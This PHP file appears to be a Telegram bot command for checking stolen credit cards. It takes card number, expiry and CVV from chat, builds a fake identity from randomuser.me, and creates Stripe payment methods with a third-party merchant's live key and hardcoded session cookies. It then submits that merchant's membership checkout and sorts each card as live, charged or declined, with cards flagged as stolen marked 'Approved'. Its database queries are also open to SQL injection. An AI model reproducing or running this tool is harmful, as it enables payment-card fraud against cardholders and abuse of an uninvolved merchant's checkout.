<?php
if(strpos($message, '!str') === 0 or strpos($message, '/str') === 0 or strpos($message, '.str') === 0){
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
    $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
$current = time();
$sec = $current - $times;
if($role == 'MEMBER' and $sec < 20)
{
 $after = 20 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <i> TRY AGAIN AFTER $after sec.</i></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}elseif($role == 'USER' and $sec < 120)
{
 $after = 120 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <i> TRY AGAIN AFTER $after sec.</i></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}elseif(empty($role)){
 reply_to($chatId,$message_id,$keyboard,$noregister);
 exit();
}
sendaction($chatId, typing);
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
$vaut = array(1,2,3,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
    
    
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
"user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''))",
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=69500903-6117-4012-8fba-bae015db9e7428266e&muid=9f152355-0b26-4a85-ace3-87fd15759ae9a6ae21&sid=3f0cc768-b2aa-4b6e-a85b-944d4d57805fceceba2&pasted_fields=number&payment_user_agent=stripe.js%2F1304e8886%3B+stripe-js-v3%2F1304e8886&time_on_page=29595&referrer=https%3A%2F%2Fwww.northstarbadcharts.com%2F&key=pk_live_51J0BTHAccnJh2MQZPbsFMpG8K66EGRlh8c0m9W0pIII8G32Bzv3S1g5HkI3U9oozUhl89fnzYvYvOFjIn2Io5c9j00M0IhUdxs');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$brand = trim(strip_tags(getStr($result1,'"brand": "','"')));
curl_close($ch);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

    
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.northstarbadcharts.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.northstarbadcharts.com',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: PHPSESSID=r0idid3lrtpqsud5s4sp05lo0j;pmpro_visit=1;__stripe_mid=3ffa896e-4042-4cf9-ba4a-5a91d53eca979a4712;__stripe_sid=b64550c8-bcbc-4c07-92be-ee6257af67fe8fbc22',
'origin: https://www.northstarbadcharts.com',
'referer: https://www.northstarbadcharts.com/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'x-requested-with: XMLHttpRequest',
'sec-fetch-site: same-origin',
"user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''))",
   ));

// # ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&username='.$usrnme.'&password='.$pwd.'&password2='.$pwd.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&gateway=stripe&CardType='.$brand.'&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');

  $result = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result,'"cvc_check":"','"')));
curl_close($ch);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if (strpos($result, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  $author = 'CVV Matched';
  cvv($list);
}elseif (strpos($result1, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  $author = 'CVV Matched';
    cvv($list);
}elseif(strpos($result, "Thank You For Donation." )) {
  $status = 'Approved✅';
  $cc_code = 'CHARGED ';
  $author = 'CVV Matched';
    cvv($list);
}elseif(strpos($result, "Thank You." )) {
  $status = 'Approved✅';
  $cc_code = 'CHARGED';
  $author = 'CVV matched';
    cvv($list);
}elseif(strpos($result, "Your card's security code is incorrect" )) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
    ccn($list);
}elseif(strpos($result, 'security code is invalid.' )) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
      ccn($list);
}elseif(strpos($result, 'Invalid service code (restricted)' )) {
  $status = 'Approved✅';
  $cc_code = 'CCN or CVV Live';
      ccn($list);
}elseif (strpos($result, "Invalid CVV value")) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
      ccn($list);
} elseif (strpos($result, "Card is expired")) {
  $status = 'Dead❌';
  $cc_code = 'Expired';
}elseif(strpos($result, 'Invalid Card Number' )) {
  $status = 'Betichod❌';
  $cc_code = 'incorrect_zip';
}elseif (strpos($result, "Hold card (stolen)")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (stolen)';
}elseif (strpos($result, "stolen_card")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (stolen)';
}elseif (strpos($result, "pickup_card")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (pickup)';
}elseif (strpos($result, 'action="./fee_declined.php" ')) {
  $status = 'Error❌';
  $cc_code = 'Fee Decline(Does Not Support Card)';
}elseif(strpos($result, 'Card number error')) {
  $status = 'Declined ❌';
  $cc_code = 'Card number error';
}elseif(strpos($result, 'No such issuer')) {
  $status = 'Declined ❌';
  $cc_code = 'NO SUCH ISSUER. Returned when the first 6 digits of the card number are not recognized by the Issuer.Re-enter transaction.';
}elseif (strpos($result, "pickup_card")) {
  $status = 'Approved✅';
  $cc_code = 'pickup_card';
  cvv($list);
}elseif(strpos($result, 'Your card number is incorrect.')) {
  $status = 'Declined ❌';
  $cc_code = 'incorrect_number';
}elseif (strpos($result, "incorrect_number")) {
  $status = 'Declined ❌';
  $cc_code = 'incorrect_number';
}elseif(strpos($result, 'do_not_honor')) {
  $status = 'Declined ❌';
  $cc_code = 'do_not_honor';
}elseif (strpos($result, "generic_decline")) {
  $status = 'Declined ❌';
  $cc_code = 'generic_decline';
}elseif (strpos($result, "Your card was declined.")) {
  $status = 'Declined ❌';
  $cc_code = 'Card Declined';
}elseif (strpos($result, '"cvc_check": "unchecked"')) {
  $status = 'Declined ❌';
  $cc_code = 'unchecked';
}elseif (strpos($result, 'Transaction not permitted (Card)')) {
  $status = 'Declined ❌';
  $cc_code = 'Transaction not permitted (Card)';
}elseif (strpos($result, "You have tried this card too many times, please contact merchant.")) {
  $status = 'Declined❌';
  $cc_code = 'You have tried this card too many times, please contact merchant.';
}elseif (strpos($result,'Merchant does not accept this card, try a different card')) {
  $status = 'Declined ❌';
  $cc_code = 'Merchant does not accept this card, try a different card';
}else{
  $status = 'Declined ❌';
  $cc_code = 'Unknown Errror.';
}

$result = urlencode("<b>
GATE --> <i>STRIPE - AUTH</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>